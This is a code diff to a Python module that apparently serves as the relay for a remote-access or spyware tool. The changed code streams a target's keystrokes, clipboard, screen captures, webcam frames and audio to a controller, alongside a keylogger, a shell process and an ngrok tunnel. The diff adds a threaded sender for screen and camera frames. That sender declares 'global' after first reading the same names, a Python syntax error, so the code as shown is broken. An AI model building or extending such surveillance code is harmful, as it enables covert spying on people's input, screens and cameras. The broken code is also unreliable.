@@ -40,6 +40,41 @@ _keylogger = None
 _shell_proc = None
 _upload_sessions = {}  # session_id -> {path, tmp, total, received}
 
+# ── Non-blocking frame / camera sender ───────────────────────────────────────
+# Screencap and camera threads deposit frames here and return immediately.
+# A dedicated sender thread picks up the latest frame and sends it, dropping
+# any frame that was superseded before the previous send finished.
+
+_frame_latest  = None   # latest screen frame waiting to be sent
+_camera_latest = None   # latest camera frame waiting to be sent
+_media_lock    = threading.Lock()
+_media_event   = threading.Event()
+
+
+def _media_sender():
+    while True:
+        _media_event.wait()
+        _media_event.clear()
+        with _media_lock:
+            f = _frame_latest
+            c = _camera_latest
+        if f is not None:
+            _emit("frame",        {"data": f})
+            with _media_lock:
+                global _frame_latest
+                # only clear if it hasn't been replaced while we were sending
+                if _frame_latest is f:
+                    _frame_latest = None
+        if c is not None:
+            _emit("camera_frame", {"data": c})
+            with _media_lock:
+                global _camera_latest
+                if _camera_latest is c:
+                    _camera_latest = None
+
+
+threading.Thread(target=_media_sender, daemon=True, name="relay-media").start()
+
 
 def init(controller_fn, recorder, camera, mic=None):
     global _controller, _recorder, _camera, _mic
@@ -57,12 +92,22 @@ def _emit(event, data):
         pass
 
 
-def broadcast_frame(b64):      _emit("frame",        {"data": b64})
-def broadcast_key(data):       _emit("key",          data if isinstance(data, dict) else {"char": data})
-def broadcast_camera(b64):     _emit("camera_frame", {"data": b64})
-def broadcast_clipboard(text): _emit("clipboard",    {"text": text})
-def broadcast_ngrok_url(url):  _emit("ngrok_url",    {"url": url})
-def broadcast_audio(b64):      _emit("audio",        {"data": b64})
+def broadcast_frame(b64):
+    global _frame_latest
+    with _media_lock:
+        _frame_latest = b64
+    _media_event.set()
+
+def broadcast_camera(b64):
+    global _camera_latest
+    with _media_lock:
+        _camera_latest = b64
+    _media_event.set()
+
+def broadcast_key(data):       _emit("key",      data if isinstance(data, dict) else {"char": data})
+def broadcast_clipboard(text): _emit("clipboard", {"text": text})
+def broadcast_ngrok_url(url):  _emit("ngrok_url", {"url": url})
+def broadcast_audio(b64):      _emit("audio",     {"data": b64})
 
 
 def _make_client():
